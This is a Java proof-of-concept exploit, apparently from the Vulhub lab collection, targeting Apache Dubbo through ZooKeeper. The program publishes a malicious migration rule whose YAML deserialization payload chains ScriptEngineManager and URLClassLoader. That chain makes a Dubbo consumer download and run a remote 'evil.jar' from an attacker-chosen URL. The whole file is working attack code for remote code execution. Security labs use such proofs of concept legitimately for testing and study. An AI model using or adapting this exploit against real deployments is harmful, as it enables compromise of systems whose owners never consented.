package org.vulhub.poc;

import org.apache.curator.framework.CuratorFramework;
import org.apache.curator.framework.CuratorFrameworkFactory;
import org.apache.curator.retry.RetryOneTime;

import java.util.concurrent.TimeUnit;

public class PublishMigrationRule {
    private static final String DEFAULT_RULE_PATH = "/dubbo/config/MIGRATION/demo-consumer.migration";
    private static final int CONNECT_TIMEOUT_SECONDS = 10;

    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        String zookeeper = positional.length > 0 ? positional[0] : "zookeeper:2181";
        String evilJarUrl = positional.length > 1 ? positional[1] : "http://127.0.0.1:8888/evil.jar";
        String rulePath = positional.length > 2 ? positional[2] : DEFAULT_RULE_PATH;

        String payload = "!!org.apache.dubbo.rpc.cluster.support.migration.MigrationRule\n"
                + "key: !!javax.script.ScriptEngineManager [\n"
                + "  !!java.net.URLClassLoader [[\n"
                + "    !!java.net.URL [\"" + evilJarUrl + "\"]\n"
                + "  ]]\n"
                + "]\n"
                + "step: FORCE_INTERFACE\n";

        CuratorFramework client = CuratorFrameworkFactory.newClient(zookeeper, new RetryOneTime(1000));
        System.out.println("Connecting to ZooKeeper: " + zookeeper);
        System.out.println("Using evil.jar URL: " + evilJarUrl);
        if (evilJarUrl.contains("127.0.0.1") || evilJarUrl.contains("localhost")) {
            System.out.println("Note: the Dubbo consumer container must be able to reach this URL. "
                    + "Use host.docker.internal or a reachable host IP if 127.0.0.1 points to the container itself.");
        }

        try {
            client.start();
            if (!client.blockUntilConnected(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)) {
                throw new IllegalStateException("Timed out connecting to ZooKeeper after "
                        + CONNECT_TIMEOUT_SECONDS + " seconds: " + zookeeper);
            }

            byte[] data = payload.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            if (client.checkExists().forPath(rulePath) == null) {
                client.create().creatingParentsIfNeeded().forPath(rulePath, data);
            } else {
                client.setData().forPath(rulePath, data);
            }

            System.out.println("Published malicious migration rule to ZooKeeper: " + rulePath);
        } finally {
            client.close();
        }
    }
}
